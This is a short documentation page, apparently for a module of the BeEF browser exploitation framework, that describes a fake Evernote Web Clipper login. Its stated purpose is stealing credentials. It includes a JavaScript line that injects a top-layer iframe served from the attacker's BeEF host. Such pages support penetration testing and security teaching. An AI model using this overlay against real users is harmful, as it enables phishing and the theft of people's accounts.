## Summary

* **Objective**: Fake EverNote Web Clipper Login
* **Authors**: xntrik
* **Browsers**: Chrome

* [Code](https://github.com/beefproject/beef/tree/master/modules/social_engineering/fake_evernote_clipper)

## Internal Working

This module displays a fake evernote web clipper login page to steal credentials.

```js
beef.dom.createIframe('custom', {'src':beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/ev/login.html','id':'EVIFRAME'}, {'width':'317px','height':'336px','position':'fixed','right':'0px','top':'0px','z-index':beef.dom.getHighestZindex()+1,'border':'0px','overflow':'hidden'});
```


## Feedback

